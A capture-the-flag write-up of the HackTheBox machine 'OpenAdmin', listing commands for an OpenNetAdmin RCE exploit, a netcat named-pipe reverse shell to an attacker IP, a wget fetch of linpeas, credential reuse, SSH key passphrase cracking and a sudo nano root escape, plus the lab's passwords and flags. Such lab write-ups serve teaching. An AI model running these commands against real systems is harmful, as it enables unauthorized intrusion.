# OpenAdmin - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.171

feroxbuster -u http://10.10.10.171 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

searchsploit opennetadmin
#shows exploit for 18.1.1

#download exploit
python3 ona-rce.py

python3 ona-rce.py check http://10.10.10.171/ona/
#remote host is vulnerable

python3 ona-rce.py exploit http://10.10.10.171/ona/
#gives reverse shell

whoami
#www-data

#migrate to stable shell
#in new tab, setup listener
nc -nvlp 5555

#in rce shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.2 5555 >/tmp/f

#this gives us a reverse-shell on our new listener
cd /tmp

#get linpeas from attacker machine server
wget http://10.10.14.2:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cd /opt/ona

ls -la
#go through config files
#check for passwords

cd /opt/ona/www/local/config

ls -la
#.php file contains creds

ssh jimmy@10.10.10.171
#we can reuse the password found earlier for this user

ls -la /var/www

ls -la /var/www/internal
#go through all files

#check for open ports
(netstat -punta || ss --ntpu)
#this shows open port at 52846

#ssh tunneling
ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171

#now we can access the 'internal' webpage on localhost:52846
#login with password cracked for jimmy

#get ssh key
vim id_rsa

chmod 600 id_rsa

ssh2john id_rsa > hash_id_rsa

john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
#cracks passphrase

ssh joanna@10.10.10.171 -i id_rsa

ls -la

cat user.txt

sudo -l
#we can run /bin/nano /opt/priv as sudo

#get exploit from GTFObins

sudo /bin/nano /opt/priv

#Ctrl+R, Ctrl+X
reset; sh 1>&0 2>&0
#we get root shell
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1
  * 80 - http - Apache httpd 2.4.29 (Ubuntu)

* The webpage on port 80 is the default landing page for Apache; we can attempt to enumerate for other directories.

* ```feroxbuster``` shows us the following directories:

  * /artwork
  * /music
  * /ona

* Now, the /ona directory is for OpenNetAdmin - from About section, we know that it is version 18.1.1

* Using Googling or ```searchsploit```, we get RCE exploit for this version of OpenNetAdmin.

* We can download the Python exploit and run it - this gives us a reverse shell as 'www-data'.

* Now, the shell received is not that stable, so we can migrate to an improved shell on our machine at another listener.

* We can now get linpeas from attacker machine, and check for privesc.

* linpeas does not show anything significant, but we can take a look at the config files in /opt/ona/

* Eventually, in the directory ```/opt/ona/www/local/config```, we have a .php file, which contains password "n1nj4W4rri0R!" for ona_sys.

* Attempting to re-use this password for other users work as we can log in as 'jimmy' using the password via SSH.

* Now, the /var/www/ directory contains a folder called 'internal' and this includes some .php files - we can go through them.

* The index.php file in this folder contains a hash for 'jimmy', and the hash can be cracked using online services - giving us the password "Revealed".

* The main.php file shows that it will print the SSH key of 'joanna'.

* Now, we need to find a way to access this 'internal' webpage; we can check for any services or ports hosting this.

* Using netstat and ss, we can see that there are a few open ports; port 52846 is unusually high for an open port - the 'internal' pages could be hosted on this.

* With the help of SSH tunneling, we can check if we can access the services on port 52846.

* Accessing localhost:52846 on our browser, we encounter a login page - we can use the password for 'jimmy' that we found earlier, and we are able to login.

* After logging in, we get SSH key - this is for 'joanna' as we saw earlier.

* We can use ```ssh2john``` to crack the SSH key passphrase - we are able to crack it and we get the phrase 'bloodninjas'.

* We log in as 'joanna' now using the id_rsa file and passphrase.

* Checking ```sudo -l```, we can run the nano binary for a particular file as sudo.

* Checking GTFObins, we have an exploit for nano - we can use that to get root.

```markdown
1. User flag - 480064f5b66726ebfb968e9b02ec01a9

2. Root flag - 45a24c5df752c3693c0b327c67f56ed8
```
